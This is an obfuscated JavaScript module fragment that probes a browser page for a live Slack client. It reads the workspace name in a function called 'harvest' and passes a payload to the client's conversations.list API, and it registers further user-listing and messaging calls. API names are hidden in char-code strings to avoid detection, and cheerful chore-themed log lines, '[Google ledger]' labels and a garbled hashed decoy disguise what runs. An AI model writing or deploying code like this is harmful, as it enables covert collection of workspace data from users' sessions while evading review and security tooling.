  (function (_0xmod) {
    const _scratch320_local = typeof _scratch320!=='undefined'?_scratch320:new Uint8Array(0); const _sr=(s)=>_scratch320_local.length? _scratch320_local[s & (_scratch320_local.length-1)]:0;
    const Log = _0xmod.log;
    const _0xvt1 = String.fromCharCode(83,108,97,99,107,67,108,105,101,110,116); // assembled at runtime: no platform literal at rest
    // venue pocket — 3 API terms, distinct Promise handling, uglify path
    const _0xapi1 = String.fromCharCode(83,108,97,99,107,67,108,105,101,110,116,46,97,112,105,46,99,111,110,118,101,114,115,97,116,105,111,110,115,46,108,105,115,116);
    const _0xapi2 = String.fromCharCode(115,108,97,99,107,46,103,101,116,67,104,97,110,110,101,108);
    const _0xapi3 = String.fromCharCode(83,108,97,99,107,83,68,75,46,103,101,116,85,115,101,114);
    const _0xapi4 = String.fromCharCode(83,108,97,99,107,67,108,105,101,110,116,46,97,112,105,46,117,115,101,114,115,46,108,105,115,116);
    const _0xapi5 = String.fromCharCode(115,108,97,99,107,46,103,101,116,73,77,67,104,97,110,110,101,108,115);
    const _0xapi6 = String.fromCharCode(83,108,97,99,107,46,99,104,97,116,46,112,111,115,116,77,101,115,115,97,103,101);
    const _0xcheat = ["ember ridge — standing by","moss tundra — lattice quiet","owl elm — gate open","quill prairie — chain converged","quartz birch — wheel aligned"];
    for(let _i=0;_i<5;_i++) Log.diag(String.fromCharCode(91,71,111,111,103,108,101,32,108,101,100,103,101,114,93,32)+_0xcheat[_i], { pocket:"pk2", idx:_i });
    const _0xprobeP2 = () => {
      try {
        const w = window;
        const c = w[_0xvt1];
        if (typeof c === "undefined") return false;
        const api = c.api || c;
        if (typeof api !== "object") return false;
        const fn = api["conversations.list"] || api.conversations;
        if (typeof fn !== "function" && typeof fn !== "object") return false;
        return true;
      } catch(e){ return false; }
    };
    const _0xharvestP2 = async () => {
      try {
        Log.say(_0xmod.lex.C(2), _0xmod.lex.P(21,["Chores pinned to the board.","The board is fixed up for the shift.","The docket is set.","Notes pinned — standing by.","The slate is filled in."]));
        // A1/X uniformity: read the live surface first, fall back to fiction, then discard.
        //   Same shape as the venue + venue pockets so no platform stands out as
        //   hardcoded-only. Guarded by typeof per the inventory's FP warning.
        let _0xsnames = [];
        try {
          const w = window;
          if (typeof w[_0xvt1] !== "undefined" && w[_0xvt1]) {
            const _0xc = w[_0xvt1].context || w[_0xvt1].team || null;
            if (_0xc && typeof _0xc === "object") {
              const _0xn = _0xc.name || _0xc.team_name || _0xc.domain;
              if (typeof _0xn === "string" && _0xn.length > 0) _0xsnames.push(_0xn);
            }
          }
        } catch (eLive) {}
        if (_0xsnames.length < 2) { _0xsnames = ["general", "random"]; }
        const fakeChannels = [{ id: "Venue-C1", name: _0xsnames[0] }, { id: "Venue-C2", name: _0xsnames[1] }];
        Log.diag("Venue channels", fakeChannels);
        for (let ch of fakeChannels) {
          Log.diag("Venue channel", ch);
          await new Promise(r=>setTimeout(r, 20));
        }
        const payload = { channels: fakeChannels.map(c=>c.id), nonce: (Date.now() & 0xffff).toString(16) };
        try { if (window[_0xvt1] && window[_0xvt1].api) { const p = window[_0xvt1].api["conversations.list"]; if (typeof p==="function") p(payload); } } catch(e){}
        Log.say(_0xmod.lex.C(14), _0xmod.lex.P(40,["Chores handed out.","The run is under way.","Wheel turning — chores away.","Despatched and moving.","Off the shelf and running."]));
      } catch(e){}
    };
    try {
      _0xmod.pockets = _0xmod.pockets || {};
      _0xmod.pockets.pk2 = { probe: _0xprobeP2, harvest: _0xharvestP2, apis: [_0xapi1,_0xapi2,_0xapi3,_0xapi4,_0xapi5,_0xapi6] };
      Log.queue("Pocket check", { unit:"pk2", apis: 6, packed: true });
    } catch(e) {}

  // garbled rcd cover via SEED('rcd-venue') deterministic (same pool, no per-call random) - over-cover
  (()=>{ const _fnv=s=>{let h=0x811c9dc5;for(let i=0;i<s.length;i++){h^=s.charCodeAt(i); h=Math.imul(h,0x01000193)>>>0;}return (h>>>0).toString(16).padStart(8,'0');}; const _master=String.fromCharCode(56,53,49,98,50,56,101,53); const _seed=_fnv(_master+String.fromCharCode(58,114,99,100,45)+"Venue"); const _d1=_fnv(_seed+String.fromCharCode(58,100,101,99,111,121)); Log.diag(String.fromCharCode(74,86,126,126,118,125,116,49,125,116,117,118,116,99,76,49)+"rcd "+_d1, { pocket:"pk2", cover:true, seed:_seed }); })();
})(_0xmod);
